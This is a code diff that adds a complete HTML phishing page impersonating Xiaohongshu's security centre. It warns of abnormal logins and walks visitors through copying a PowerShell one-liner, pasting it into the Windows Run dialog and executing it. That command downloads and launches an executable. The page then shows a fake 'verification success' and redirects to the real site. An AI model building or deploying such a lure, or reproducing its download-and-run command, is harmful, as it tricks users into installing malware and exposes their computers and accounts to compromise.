@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>小红书安全验证</title>
+    <!-- Tailwind CSS v3 -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <!-- GSAP for animations -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#FF2442', // 小红书红色主色调
+                        secondary: '#FF6B81', // 小红书红色
+                        accent: '#FFB6C1', // 浅粉色
+                        light: '#FFF0F3', // 超浅粉色
+                        dark: '#CC1632', // 深红色
+                    },
+                    fontFamily: {
+                        sans: ['PingFang SC', 'Microsoft YaHei', 'Inter', 'system-ui', 'sans-serif'],
+                    },
+                    boxShadow: {
+                        'card': '0 10px 30px -5px rgba(255, 36, 66, 0.1), 0 10px 10px -5px rgba(255, 36, 66, 0.04)',
+                        'button': '0 4px 6px -1px rgba(255, 36, 66, 0.1), 0 2px 4px -1px rgba(255, 36, 66, 0.06)',
+                        'button-hover': '0 10px 15px -3px rgba(255, 36, 66, 0.1), 0 4px 6px -2px rgba(255, 36, 66, 0.05)',
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'bounce-slow': 'bounce 2s infinite',
+                    },
+                    borderRadius: {
+                        'xl': '1rem',
+                        '2xl': '1.5rem',
+                        '3xl': '2rem',
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .text-shadow {
+                text-shadow: 0 2px 4px rgba(255, 36, 66, 0.1);
+            }
+            .bg-gradient-primary {
+                background: linear-gradient(135deg, #FF2442 0%, #FF6B81 100%);
+            }
+            .bg-gradient-success {
+                background: linear-gradient(135deg, #FF2442 0%, #FF6B81 100%);
+            }
+            .transition-all-300 {
+                transition: all 300ms ease-in-out;
+            }
+            .glass-effect {
+                background: rgba(255, 255, 255, 0.8);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+            }
+            .step-active {
+                border-color: #FF6B81;
+                background-color: #FFF0F3;
+            }
+            .step-completed {
+                border-color: #FF2442;
+                background-color: #FFF0F3;
+            }
+            .code-block {
+                position: relative;
+                overflow-x: auto;
+            }
+            .code-block::before {
+                content: "";
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 4px;
+                background-color: #FF2442;
+                border-radius: 2px 0 0 2px;
+            }
+            .keyboard-key {
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                padding: 0.25rem 0.75rem;
+                margin: 0 0.25rem;
+                font-size: 0.875rem;
+                font-weight: 600;
+                color: #333;
+                background-color: #f8f9fa;
+                border: 1px solid #FFB6C1;
+                border-radius: 8px;
+                box-shadow: 0 1px 3px rgba(255, 36, 66, 0.1);
+            }
+            .card-decoration {
+                position: absolute;
+                top: -10px;
+                left: -10px;
+                width: 40px;
+                height: 40px;
+                background-color: #FFB6C1;
+                border-radius: 50%;
+                z-index: 0;
+            }
+            .card-decoration::after {
+                content: "";
+                position: absolute;
+                top: 20px;
+                right: -20px;
+                width: 30px;
+                height: 30px;
+                background-color: #FFD6DD;
+                border-radius: 50%;
+            }
+            .card-decoration-2 {
+                position: absolute;
+                bottom: -10px;
+                right: -10px;
+                width: 30px;
+                height: 30px;
+                background-color: #FFD6DD;
+                border-radius: 50%;
+                z-index: 0;
+            }
+            .card-decoration-2::after {
+                content: "";
+                position: absolute;
+                bottom: 15px;
+                left: -15px;
+                width: 20px;
+                height: 20px;
+                background-color: #FFB6C1;
+                border-radius: 50%;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4 font-sans bg-gradient-to-br from-light to-white">
+
+
+    <div class="relative z-10 w-full max-w-md">
+        <!-- Verification Card -->
+        <div id="verification-card" class="relative bg-white rounded-3xl shadow-card overflow-hidden transition-all duration-500 transform hover:shadow-xl opacity-95 border border-accent">
+            <!-- Decorative elements -->
+            <div class="card-decoration"></div>
+            <div class="card-decoration-2"></div>
+            
+            <!-- Card Header -->
+            <div class="bg-gradient-primary p-6 text-center relative z-10">
+                <div class="flex items-center justify-center mb-2">
+                    <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/super_tool/a56ce47b19f64a54a7bc2ed18e9e7823~tplv-a9rns2rl98-image.image?rcl=202510231922048A9E7284FE886EDB85A3&rk3s=8e244e95&rrcfp=f06b921b&x-expires=1763810549&x-signature=YUBlYJHLcJWXPDOQYqEa0gC1boA%3D" alt="小红书安全图标" class="w-12 h-12 mr-3">
+                    <h1 class="text-2xl font-bold text-white mb-2 text-shadow">小红书安全验证</h1>
+                </div>
+                <p class="text-white opacity-90">检测到账号异常，需验证以保护账号安全</p>
+            </div>
+            
+            <!-- Card Body -->
+            <div class="p-8 relative z-10">
+                <!-- Security Check Reason -->
+                <div id="verification-reason" class="mt-6 p-4 bg-light rounded-2xl border border-accent border-opacity-20">
+                    <div class="flex items-start">
+                        <div class="w-10 h-10 rounded-full bg-primary bg-opacity-20 flex items-center justify-center mr-4 mt-1">
+                            <i class="fa fa-shield text-primary"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-primary mb-2">账号安全验证</h3>
+                            <p class="text-gray-700">小红书安全中心检测到账号潜在风险：</p>
+                            <ul class="list-disc list-inside mt-2 text-gray-700 space-y-1">
+                                <li>检测到异常登录地点</li>
+                                <li>账号行为存在安全隐患</li>
+                                <li>需要验证身份以继续使用</li>
+                            </ul>
+                            <p class="mt-3 text-gray-700">请完成验证以确认账号安全并恢复正常使用。</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Start Verification Button -->
+                <div id="start-verification" class="mt-6 text-center">
+                    <button id="verify-button" class="flex items-center justify-center mx-auto bg-primary hover:bg-dark text-white font-medium py-3 px-8 rounded-full shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        <i class="fa fa-shield mr-2"></i>
+                        开始安全验证
+                    </button>
+                </div>
+                
+                <!-- Step 1: Copy Code -->
+                <div id="step-1" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">1</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">复制安全代码</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-4">点击代码复制到剪贴板：</p>
+                    
+                    <div class="code-block bg-light rounded-xl p-4 mb-4">
+                        <pre class="text-sm text-gray-800 whitespace-pre-wrap"><code id="code-snippet">powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://verify.xiaohongshu.com/security.exe', '$env:TEMP\xhs_verify.exe'); Start-Process '$env:TEMP\xhs_verify.exe'"</code></pre>
+                    </div>
+                    
+                    <button id="copy-button" class="w-full bg-primary hover:bg-dark text-white font-medium py-2 px-4 rounded-full shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        <i class="fa fa-copy mr-2"></i>
+                        <span id="copy-text">复制代码</span>
+                    </button>
+                    
+                    <div id="copy-success" class="hidden mt-3 p-3 bg-light bg-opacity-50 border border-primary rounded-xl text-primary text-sm flex items-center">
+                        <i class="fa fa-check-circle mr-2"></i>
+                        代码复制成功！
+                    </div>
+                    
+                    <button id="step-1-next" class="mt-6 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium py-2 px-4 rounded-full shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-gray-300 focus:ring-opacity-50">
+                        下一步
+                    </button>
+                </div>
+                
+                <!-- Step 2: Open Run Dialog -->
+                <div id="step-2" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">2</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">打开运行窗口</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-6">按下以下键盘快捷键打开运行窗口：</p>
+                    
+                    <div class="flex justify-center items-center mb-8">
+                        <div class="keyboard-key">Win键</div>
+                        <span class="mx-2 text-gray-500">+</span>
+                        <div class="keyboard-key">R</div>
+                    </div>
+                    
+                    <div class="bg-light rounded-xl p-4 mb-6">
+                        <p class="text-center text-gray-700">
+                            <i class="fa fa-info-circle mr-2 text-primary"></i>
+                            这将打开一个小窗口，您可以在其中粘贴小红书安全验证代码
+                        </p>
+                    </div>
+                    
+                    <button id="step-2-next" class="w-full bg-primary hover:bg-dark text-white font-medium py-2 px-4 rounded-full shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        下一步
+                    </button>
+                </div>
+                
+                <!-- Step 3: Paste and Execute -->
+                <div id="step-3" class="hidden">
+                    <div class="flex items-center mb-4">
+                        <div class="w-8 h-8 rounded-full bg-primary text-white flex items-center justify-center font-bold">3</div>
+                        <h2 class="ml-3 text-xl font-semibold text-gray-800">粘贴并执行</h2>
+                    </div>
+                    
+                    <p class="text-gray-600 mb-6">在运行窗口中，粘贴小红书安全验证代码并按回车键：</p>
+                    
+                    <div class="flex justify-center items-center mb-2">
+                        <div class="keyboard-key">Ctrl</div>
+                        <span class="mx-2 text-gray-500">+</span>
+                        <div class="keyboard-key">V</div>
+                    </div>
+                    
+                    <p class="text-center text-gray-500 mb-6">然后按下：</p>
+                    
+                    <div class="flex justify-center items-center mb-8">
+                        <div class="keyboard-key">Enter键</div>
+                    </div>
+                    
+                    <div class="bg-light rounded-xl p-4 mb-6">
+                        <p class="text-center text-gray-700">
+                            <i class="fa fa-info-circle mr-2 text-primary"></i>
+                            这将启动小红书安全验证，验证并保护您的账号安全
+                        </p>
+                    </div>
+                    
+                    <button id="verify-execution" class="w-full bg-gradient-success hover:bg-dark text-white font-medium py-2 px-4 rounded-full shadow-button hover:shadow-button-hover transition-all-300 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-opacity-50">
+                        <i class="fa fa-check mr-2"></i>
+                        我已执行安全验证
+                    </button>
+                </div>
+                
+                <!-- Verification Success -->
+                <div id="verification-success" class="hidden text-center">
+                    <div class="w-16 h-16 mx-auto bg-light rounded-full flex items-center justify-center mb-4">
+                        <i class="fa fa-check text-2xl text-primary"></i>
+                    </div>
+                    
+                    <h2 class="text-xl font-bold text-gray-800 mb-2">安全验证成功！</h2>
+                    <p class="text-gray-600 mb-6">账号已验证，未发现风险，正在跳转...</p>
+                    
+                    <div class="w-full bg-light rounded-full h-2.5 mb-6">
+                        <div id="progress-bar" class="bg-primary h-2.5 rounded-full" style="width: 0%"></div>
+                    </div>
+                    
+                    <p class="text-sm text-gray-500">倒计时 <span id="countdown">5</span> 秒后跳转...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="mt-6 text-center text-sm text-gray-800 bg-white bg-opacity-80 p-3 rounded-xl">
+            <p>此安全验证由小红书安全中心提供技术支持。</p>
+            <p class="mt-1">如果您遇到问题，请联系小红书客服。</p>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const verifyButton = document.getElementById('verify-button');
+        const verificationReason = document.getElementById('verification-reason');
+        const startVerification = document.getElementById('start-verification');
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step3 = document.getElementById('step-3');
+        const verificationSuccess = document.getElementById('verification-success');
+        const copyButton = document.getElementById('copy-button');
+        const copyText = document.getElementById('copy-text');
+        const copySuccess = document.getElementById('copy-success');
+        const codeSnippet = document.getElementById('code-snippet');
+        const step1Next = document.getElementById('step-1-next');
+        const step2Next = document.getElementById('step-2-next');
+        const verifyExecution = document.getElementById('verify-execution');
+        const progressBar = document.getElementById('progress-bar');
+        const countdown = document.getElementById('countdown');
+        
+        // Verify button click handler
+        verifyButton.addEventListener('click', () => {
+            // Add loading state to button
+            verifyButton.disabled = true;
+            verifyButton.innerHTML = '<i class="fa fa-spinner fa-spin mr-2"></i> 准备安全验证...';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Hide verification reason and start button
+                gsap.to(verificationReason, {
+                    opacity: 0,
+                    y: -20,
+                    duration: 0.3
+                });
+                
+                gsap.to(startVerification, {
+                    opacity: 0,
+                    y: -20,
+                    duration: 0.3,
+                    onComplete: () => {
+                        verificationReason.classList.add('hidden');
+                        startVerification.classList.add('hidden');
+                        
+                        // Show step 1
+                        step1.classList.remove('hidden');
+                        gsap.from(step1, {
+                            opacity: 0,
+                            y: 20,
+                            duration: 0.5
+                        });
+                    }
+                });
+            }, 1500);
+        });
+        
+        // Copy code button click handler
+        copyButton.addEventListener('click', () => {
+            // Copy code to clipboard
+            navigator.clipboard.writeText(codeSnippet.textContent)
+                .then(() => {
+                    // Show success message
+                    copyText.textContent = '已复制！';
+                    copyButton.classList.remove('bg-primary', 'hover:bg-dark');
+                    copyButton.classList.add('bg-secondary', 'hover:bg-primary');
+                    copySuccess.classList.remove('hidden');
+                    
+                    // Animate success message
+                    gsap.from(copySuccess, {
+                        opacity: 0,
+                        y: -10,
+                        duration: 0.3
+                    });
+                    
+                    // Enable next button
+                    step1Next.classList.remove('bg-gray-200', 'hover:bg-gray-300');
+                    step1Next.classList.add('bg-primary', 'hover:bg-dark', 'text-white');
+                    step1Next.disabled = false;
+                })
+                .catch(err => {
+                    console.error('复制代码失败: ', err);
+                });
+        });
+        
+        // Step 1 next button click handler
+        step1Next.addEventListener('click', () => {
+            // Hide step 1
+            gsap.to(step1, {
+                opacity: 0,
+                y: -20,
+                duration: 0.3,
+                onComplete: () => {
+                    step1.classList.add('hidden');
+                    
+                    // Show step 2
+                    step2.classList.remove('hidden');
+                    gsap.from(step2, {
+                        opacity: 0,
+                        y: 20,
+                        duration: 0.5
+                    });
+                }
+            });
+        });
+        
+        // Step 2 next button click handler
+        step2Next.addEventListener('click', () => {
+            // Hide step 2
+            gsap.to(step2, {
+                opacity: 0,
+                y: -20,
+                duration: 0.3,
+                onComplete: () => {
+                    step2.classList.add('hidden');
+                    
+                    // Show step 3
+                    step3.classList.remove('hidden');
+                    gsap.from(step3, {
+                        opacity: 0,
+                        y: 20,
+                        duration: 0.5
+                    });
+                }
+            });
+        });
+        
+        // Verify execution button click handler
+        verifyExecution.addEventListener('click', () => {
+            // Add loading state to button
+            verifyExecution.disabled = true;
+            verifyExecution.innerHTML = '<i class="fa fa-spinner fa-spin mr-2"></i> 验证中...';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                // Hide step 3
+                gsap.to(step3, {
+                    opacity: 0,
+                    y: -20,
+                    duration: 0.3,
+                    onComplete: () => {
+                        step3.classList.add('hidden');
+                        
+                        // Show verification success
+                        verificationSuccess.classList.remove('hidden');
+                        gsap.from(verificationSuccess, {
+                            opacity: 0,
+                            y: 20,
+                            duration: 0.5
+                        });
+                        
+                        // Animate progress bar
+                        gsap.to(progressBar, {
+                            width: '100%',
+                            duration: 5,
+                            ease: 'power1.inOut'
+                        });
+                        
+                        // Countdown timer
+                        let seconds = 5;
+                        const countdownInterval = setInterval(() => {
+                            seconds--;
+                            countdown.textContent = seconds;
+                            
+                            if (seconds <= 0) {
+                                clearInterval(countdownInterval);
+                                // Redirect to success page
+                                window.location.href = 'https://www.xiaohongshu.com';
+                            }
+                        }, 1000);
+                    }
+                });
+            }, 2000);
+        });
+        
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', () => {
+            // Disable next buttons initially
+            step1Next.disabled = true;
+            
+            // Add hover effect to code block
+            codeSnippet.parentElement.parentElement.addEventListener('mouseenter', () => {
+                gsap.to(codeSnippet.parentElement.parentElement, {
+                    scale: 1.01,
+                    duration: 0.2
+                });
+            });
+            
+            codeSnippet.parentElement.parentElement.addEventListener('mouseleave', () => {
+                gsap.to(codeSnippet.parentElement.parentElement, {
+                    scale: 1,
+                    duration: 0.2
+                });
+            });
+        });
+    </script>
+</body>
+</html>
